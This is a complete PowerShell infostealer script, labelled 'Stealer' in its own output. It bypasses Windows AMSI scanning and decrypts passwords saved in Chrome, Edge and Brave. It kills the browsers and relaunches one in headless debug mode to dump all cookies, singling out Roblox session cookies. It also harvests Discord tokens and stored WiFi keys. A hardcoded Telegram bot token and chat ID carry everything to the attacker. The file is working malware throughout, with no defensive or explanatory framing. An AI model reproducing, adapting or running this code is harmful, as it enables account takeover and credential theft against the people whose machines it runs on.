$a=[Ref].Assembly.GetType('Sys*.Man*.Aut*.Amsi*');if($a){$b=$a.GetField('amsiInitFailed','N,P,S');if($b){$b.SetValue($null,$true)}}
$tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
$tgChat = "-1003960241194"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tgBase = "https://api.telegram.org/bot$tgToken"
$lt = [char]0x3C; $gt = [char]0x3E
function ts($m) {
  $t = "${lt}b${gt}${m}${lt}/b${gt}"
  $j = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $j -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
    catch { if ($i -ge 2) { break }; Start-Sleep -Seconds 2 }
  }
  Start-Sleep -Milliseconds 500
}
$R = "[+]"; $PC = "[i]"; $LK = "[k]"; $KY = "[k]"; $GL = "[w]"
$RB = "[g]"; $GM = "[d]"; $WF = "[n]"; $CK = "[v]"; $XX = "[x]"
$WA = "[!]"
ts "$R Stealer started"
try {
  $ip = try { (Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content } catch { try { (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { "Unknown" } }
  $os = try { (Get-WmiObject Win32_OperatingSystem).Caption } catch { try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Unknown" } }
  $cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "Unknown" }
  $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
  $user = $env:USERNAME; $comp = $env:COMPUTERNAME; $dom = $env:USERDOMAIN
  ts "$PC System:`nIP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
} catch { ts "$WA System info error: $_" }
try {
  Add-Type @"
using System; using System.Runtime.InteropServices; using System.Text;
public class N {
[DllImport("crypt32.dll")] public static extern bool CryptUnprotectData(ref D pIn, IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint f, ref D pOut);
[DllImport("kernel32.dll")] public static extern IntPtr LocalFree(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptOpenAlgorithmProvider")] public static extern int BOpen(out IntPtr h, string a, string b, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptCloseAlgorithmProvider")] public static extern int BClose(IntPtr h, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptSetProperty")] public static extern int BSetP(IntPtr h, string p, byte[] v, uint l, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGenerateSymmetricKey")] public static extern int BGenKey(IntPtr ha, out IntPtr hk, byte[] ko, uint kol, byte[] s, uint sl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptDestroyKey")] public static extern int BDesKey(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptDecrypt")] public static extern int BDec(IntPtr hk, byte[] inp, uint il, ref A ai, byte[] iv, uint ivl, byte[] op, uint ol, out uint rl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGetProperty")] public static extern int BGetP(IntPtr h, string p, byte[] o, uint ol, out uint rl, uint f);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_open_v2(string f, out IntPtr d, int fl, IntPtr z);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr d, string sql, int n, out IntPtr s, IntPtr t);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_blob(IntPtr s, int c);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(IntPtr s, int c);
[DllImport("winsqlite3.dll", CharSet=CharSet.Ansi)] public static extern IntPtr sqlite3_column_text(IntPtr s, int c);
public struct D { public uint l; public IntPtr p; }
public struct A { public uint s; public uint v; public IntPtr n; public uint nl; public IntPtr ad; public uint adl; public IntPtr tg; public uint tl; public IntPtr mc; public uint mcl; public uint f; public IntPtr r; public uint rl; }
public static byte[] DPD(byte[] d) {
D i=new D{l=(uint)d.Length,p=Marshal.AllocHGlobal(d.Length)}; Marshal.Copy(d,0,i.p,d.Length);
D o=new D(); bool ok=CryptUnprotectData(ref i,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,1,ref o);
Marshal.FreeHGlobal(i.p); if(!ok)return null;
byte[] r=new byte[o.l]; Marshal.Copy(o.p,r,0,(int)o.l); LocalFree(o.p); return r; }
public static byte[] AG(byte[] k, byte[] n, byte[] c, byte[] t) {
IntPtr ha; int ret=BOpen(out ha,"AES",null,0); if(ret!=0)return null;
byte[] g=Encoding.ASCII.GetBytes("GCM\0"); BSetP(ha,"ChainingMode",g,4,0);
byte[] ob=new byte[4]; uint ol=0; BGetP(ha,"ObjectLength",ob,4,out ol,0);
byte[] ko=new byte[ol]; IntPtr hk;
ret=BGenKey(ha,out hk,ko,ol,k,(uint)k.Length,0); if(ret!=0){BClose(ha,0);return null;}
A ai=new A(); ai.s=(uint)Marshal.SizeOf(typeof(A)); ai.v=1;
IntPtr np=Marshal.AllocHGlobal(n.Length); Marshal.Copy(n,0,np,n.Length); ai.n=np; ai.nl=(uint)n.Length;
IntPtr tp=Marshal.AllocHGlobal(t.Length); Marshal.Copy(t,0,tp,t.Length); ai.tg=tp; ai.tl=(uint)t.Length;
byte[] op=new byte[c.Length]; uint rl=0;
ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp); BDesKey(hk); BClose(ha,0);
if(ret!=0)return null; Array.Resize(ref op,(int)rl); return op; } }
"@
  ts "$LK Crypto module:`n$CK Compiled OK"
} catch { ts "$WA Crypto module failed: $_"; exit }
$chromeKey = $null
try {
  $lsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
  if (Test-Path $lsPath) {
    $lsJson = Get-Content $lsPath -Raw | ConvertFrom-Json
    $encKey = $lsJson.os_crypt.encrypted_key
    if ($encKey) {
      $raw = [Convert]::FromBase64String($encKey)
      $dpapiBlob = $raw[5..($raw.Length - 1)]
      $chromeKey = [N]::DPD($dpapiBlob)
      if ($chromeKey) { ts "$KY Chrome master key:`n$CK $($chromeKey.Length) bytes" }
      else { ts "$KY Chrome master key:`n$XX Decryption failed" }
    }
  } else { ts "$KY Chrome master key:`n$XX Local State not found" }
} catch { ts "$WA Chrome key error: $_" }
function copyDb($dbPath) {
  $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
  $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
  $ms = New-Object System.IO.MemoryStream
  $fs.CopyTo($ms)
  $fs.Close()
  [System.IO.File]::WriteAllBytes($tmp, $ms.ToArray())
  $ms.Close()
  return $tmp
}
function openDb($dbPath) {
  try {
    $tmp = copyDb $dbPath
    $ptr = [IntPtr]::Zero
    if ([N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero) -eq 0) { return @{ptr=$ptr;tmp=$tmp} }
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
  } catch {}
  return $null
}
$pwCount = 0; $ckCount = 0; $histCount = 0; $robCookie = $null
$browserReports = @(); $allPasswords = @(); $allCookies = @()
$browsers = @(
  @("Chrome", "$env:LOCALAPPDATA\Google\Chrome\User Data"),
  @("Edge", "$env:LOCALAPPDATA\Microsoft\Edge\User Data"),
  @("Brave", "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
)
foreach ($browser in $browsers) {
  $bName = $browser[0]; $basePath = $browser[1]
  if (!(Test-Path $basePath)) { $browserReports += "$GL ${bName}:`n$XX Not installed"; continue }
  $profiles = @("Default")
  try { Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch {}
  $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null; $errMsg = $null
  foreach ($profile in $profiles) {
    $loginDb = "$basePath\$profile\Login Data"
    $historyDb = "$basePath\$profile\History"
    if (Test-Path $loginDb) {
      try {
        $db = openDb $loginDb
        if ($db) {
          $ptr = $db.ptr
          $cntStmt = [IntPtr]::Zero
          $r1 = [N]::sqlite3_prepare_v2($ptr, "SELECT COUNT(*) FROM logins", -1, [ref]$cntStmt, [IntPtr]::Zero)
          $loginRows = 0
          if ($r1 -eq 0) {
            if ([N]::sqlite3_step($cntStmt) -eq 100) {
              $cntPtr = [N]::sqlite3_column_text($cntStmt, 0)
              $loginRows = if ($cntPtr -ne [IntPtr]::Zero) { [int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr) } else { 0 }
            }
            [N]::sqlite3_finalize($cntStmt)
          }
          $stmt = [IntPtr]::Zero
          $prepRc = [N]::sqlite3_prepare_v2($ptr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero)
          if ($prepRc -eq 0) {
            $rowCount = 0
            while ([N]::sqlite3_step($stmt) -eq 100) {
              $rowCount++
              $urlPtr = [N]::sqlite3_column_text($stmt, 0); $usrPtr = [N]::sqlite3_column_text($stmt, 1)
              $encLen = [N]::sqlite3_column_bytes($stmt, 2); $encPtr = [N]::sqlite3_column_blob($stmt, 2)
              if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
                $enc = New-Object byte[] $encLen; [Runtime.InteropServices.Marshal]::Copy($encPtr, $enc, 0, $encLen)
                $nonce = $enc[3..14]; $ctLen = $encLen - 31
                if ($ctLen -gt 0) {
                  $ct = $enc[15..(14 + $ctLen)]; $tag = $enc[(15 + $ctLen)..($encLen - 1)]
                  $dec = [N]::AG($chromeKey, $nonce, $ct, $tag)
                  if ($dec -ne $null) {
                    $bpw++; $pwCount++
                    $u = if ($usrPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($usrPtr) } else { "" }
                    $l = if ($urlPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($urlPtr) } else { "" }
                    $p = [System.Text.Encoding]::UTF8.GetString($dec)
                    $allPasswords += @{url=$l;username=$u;password=$p;browser=$bName}
                  }
                }
              }
            }
            [N]::sqlite3_finalize($stmt)
          } else { $errMsg = "Login Data query error" }
          [N]::sqlite3_close($ptr)
          Remove-Item $db.tmp -Force -ErrorAction SilentlyContinue
        } else { $errMsg = "Cannot access Login Data" }
      } catch { $errMsg = "Login DB error: $_" }
    }
    if (Test-Path $historyDb) {
      try {
        $db = openDb $historyDb
        if ($db) {
          $ptr = $db.ptr
          $stmt = [IntPtr]::Zero
          if ([N]::sqlite3_prepare_v2($ptr, "SELECT COUNT(*) FROM urls", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
            if ([N]::sqlite3_step($stmt) -eq 100) {
              $cntPtr = [N]::sqlite3_column_text($stmt, 0)
              if ($cntPtr -ne [IntPtr]::Zero) { $bhist += [int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr); $histCount += $bhist }
            }
            [N]::sqlite3_finalize($stmt)
          } else { $errMsg = "History query error" }
          [N]::sqlite3_close($ptr)
          Remove-Item $db.tmp -Force -ErrorAction SilentlyContinue
        } else { $errMsg = "Cannot access History DB" }
      } catch { $errMsg = "History DB error: $_" }
    }
  }
  if ($errMsg) { $browserReports += "$GL ${bName}:`n$WA Cannot read DB (browser open?)" }
  else { $browserReports += "$GL ${bName}:`n$CK $bpw pw, $bhist hist" }
}
ts ($browserReports -join "`n")
# CDP cookies (truly fileless — no DB copies, no files)
try {
  $cex = @("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
  if (-not $cex) { $cex = @("$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe","${env:ProgramFiles}\Microsoft\Edge\Application\msedge.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1 }
  if (-not $cex) { $cex = @("$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe","${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1 }
  if ($cex) {
    Get-Process chrome,msedge,brave -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
    $port = 9222
    try { while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and $port -lt 9232) { $port++ } } catch {}
    $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --no-first-run --no-default-browser-check --disable-gpu --headless=new --disable-session-crashed-bubble" -PassThru -WindowStyle Hidden
    Start-Sleep 4
    $wsUrl = try {
      $tgts = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -ErrorAction Stop
      if ($tgts[0].webSocketDebuggerUrl) { $tgts[0].webSocketDebuggerUrl }
      else { (Invoke-RestMethod "http://127.0.0.1:$port/json/new?about:blank" -TimeoutSec 5 -ErrorAction Stop).webSocketDebuggerUrl }
    } catch { $null }
    if ($wsUrl) {
      $ws = New-Object System.Net.WebSockets.ClientWebSocket
      $ws.ConnectAsync((New-Object Uri($wsUrl)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
      $cmd = @{id=1;method="Network.getAllCookies"} | ConvertTo-Json -Compress
      $b = [Text.Encoding]::UTF8.GetBytes($cmd)
      $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
      $rb = New-Object byte[] 1048576; $list = New-Object Collections.Generic.List[byte]
      do { $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); if ($r.Count -gt 0) { $list.AddRange([byte[]]($rb[0..($r.Count-1)])) } } while (!$r.EndOfMessage)
      $ws.Dispose()
      try {
        $resp = [Text.Encoding]::UTF8.GetString($list.ToArray()) | ConvertFrom-Json
        if ($resp.result -and $resp.result.cookies -and $resp.id -eq 1) {
          $ckCount = $resp.result.cookies.Count
          foreach ($cc in $resp.result.cookies) { $allCookies += $cc; if (($cc.name -eq ".ROBLOSECURITY" -or $cc.name -eq "ROBLOSECURITY") -and $cc.domain.Contains("roblox.com")) { $robCookie = $cc.value } }
          ts "$CK CDP cookies: $ckCount"
        }
      } catch { ts "$WA CDP parse error: $_" }
      # Targeted Roblox cookie fetch
      $ws2 = New-Object System.Net.WebSockets.ClientWebSocket
      $ws2.ConnectAsync((New-Object Uri($wsUrl)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
      $cmd2 = @{id=2;method="Network.getCookies";params=@{urls=@("https://roblox.com")}} | ConvertTo-Json -Compress
      $b2 = [Text.Encoding]::UTF8.GetBytes($cmd2)
      $ws2.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b2)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
      $rb2 = New-Object byte[] 262144; $list2 = New-Object Collections.Generic.List[byte]
      do { $r2 = $ws2.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb2)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); if ($r2.Count -gt 0) { $list2.AddRange([byte[]]($rb2[0..($r2.Count-1)])) } } while (!$r2.EndOfMessage)
      $ws2.Dispose()
      try {
        $resp2 = [Text.Encoding]::UTF8.GetString($list2.ToArray()) | ConvertFrom-Json
        if ($resp2.result -and $resp2.result.cookies) {
          foreach ($cc2 in $resp2.result.cookies) { if (($cc2.name -eq ".ROBLOSECURITY" -or $cc2.name -eq "ROBLOSECURITY") -and -not $robCookie) { $robCookie = $cc2.value } }
        }
      } catch {}
    }
    if ($p -and !$p.HasExited) { $p.Kill() }
  } else { ts "$CK CDP:`n$XX No Chromium browser found" }
} catch { ts "$WA CDP error: $_" }
if ($robCookie) { $er = $robCookie.Replace("&","&amp;").Replace("<","&lt;").Replace(">","&gt;"); ts "$RB Roblox cookie:`n$CK $er" } else { ts "$RB Roblox cookie:`n$XX Not found" }
try {
  $rk = Get-ItemProperty "HKCU:\Software\Roblox\RobloxMessenger\*" -ErrorAction SilentlyContinue
  if ($rk) { ts "$RB Roblox registry:`n$CK $($rk | Out-String)" }
} catch { ts "$WA Roblox registry error: $_" }
try {
  $ra = "$env:LOCALAPPDATA\Roblox"
  if (Test-Path $ra) {
    $rf = Get-ChildItem $ra -Include *.log,*.json -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB -and $_.Length -gt 10 }
    foreach ($f in $rf) {
      $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
      if ($c -and $c -match '_WARNING.*DO-NOT-SHARE') { ts "$RB Roblox AppData cookie:`n$CK $($matches[0])" }
    }
  }
} catch { ts "$WA Roblox AppData error: $_" }
try {
  $dcDirs = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb", "$env:APPDATA\discorddevelopment")
  $tokens = @()
  $dcRegex = [regex]'[MN][A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}'
  foreach ($d in $dcDirs) {
    $ldbPath = "$d\Local Storage\leveldb"
    if (Test-Path $ldbPath) {
      Get-ChildItem $ldbPath -Include *.ldb, *.log -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $content = try { Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue } catch { $null }
        if ($content) { $dcRegex.Matches($content) | ForEach-Object { if ($tokens -notcontains $_.Value) { $tokens += $_.Value } } }
      }
    }
  }
  if ($tokens.Count -gt 0) { ts "$GM Discord tokens ($($tokens.Count)):`n$($tokens -join "`n")" } else { ts "$GM Discord tokens:`n$XX Not found" }
} catch { ts "$WA Discord scan error: $_" }
try {
  $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
  $wifiList = @()
  foreach ($ssid in $wifiProfiles) {
    $detail = netsh wlan show profile name="$ssid" key=clear
    $pw = $detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiList += "${ssid}: $pw"
  }
  if ($wifiList.Count -gt 0) { ts "$WF WiFi ($($wifiList.Count) networks):`n$($wifiList -join ' | ')" } else { ts "$WF WiFi:`n$XX No profiles found" }
} catch { ts "$WA WiFi error: $_" }
ts "$CK All phases complete"